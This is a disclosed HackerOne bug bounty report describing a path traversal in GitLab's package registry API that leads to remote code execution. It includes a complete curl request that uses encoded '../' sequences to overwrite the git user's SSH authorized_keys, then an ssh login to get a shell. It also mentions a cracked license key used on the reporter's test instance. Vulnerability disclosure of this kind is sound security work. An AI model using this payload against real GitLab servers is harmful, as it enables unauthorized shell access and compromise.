# Path traversal, to RCE

## Report Details
- **Report ID**: 733072
- **URL**: https://hackerone.com/reports/733072
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-11-09T12:03:21.882Z
- **Disclosed**: 2022-06-07T14:16:59.027Z

## Reporter
- **Username**: saltyyolk
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary
This one is similar to #732330 but much simpler.
A path traversal issue in GitLab package registry API allow an attacker to write any file at any location writable to user git in a GitLab server.

### Steps to reproduce

1. Enable package registry in your GitLab instance.
2. Create a project (package registry is enabled by default)
3. Create a private token to call the API
4. Send the following request

```
curl -H "Private-Token: $(cat token)" http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub
```
Then run `ssh git@10.26.0.5` to enjoy a shell.

### Examples

{F630231}

In my setup, I did't expose the 22 port of GitLab docker container, so I logged in the server with its docker IP, 172.18.0.2. In case there's any misunderstandings.

#### Results of GitLab environment info

```
$ gitlab-rake gitlab:env:info

System information
System:		
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	3.2.12
Git Version:	2.22.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.4.2-ee
Revision:	a3170599aa2
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.9
URL:		http://10.26.0.5
HTTP Clone URL:	http://10.26.0.5/some-group/some-project.git
SSH Clone URL:	git@10.26.0.5:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	10.2.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

```
# my docker-compose.yml
version: '3'
services:
  web:
    image: 'gitlab/gitlab-ee:latest'
    restart: always
    hostname: 'localhost'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://10.26.0.5'
        gitlab_rails['packages_enabled'] = true
    ports:
      - '10.26.0.5:80:80'
  #    - '10.26.0.5:22:22'
    volumes:
      - './config:/etc/gitlab'
      - './logs:/var/log/gitlab'
      - './data:/var/opt/gitlab'
      - ./crack/pub.pem:/opt/gitlab/embedded/service/gitlab-rails/.license_encryption_key.pub:ro
```
Please forgive me to use a crack on my self hosted testing purpose GitLab EE instance :)

## Impact

This path traversal issue could be easily exploited by overwriting some critical files related to server access. In my example I use authorized_keys of git user to enable the shell access for the attacker.

## Attachments
- 2019-11-09-195607_1919x386_scrot.png
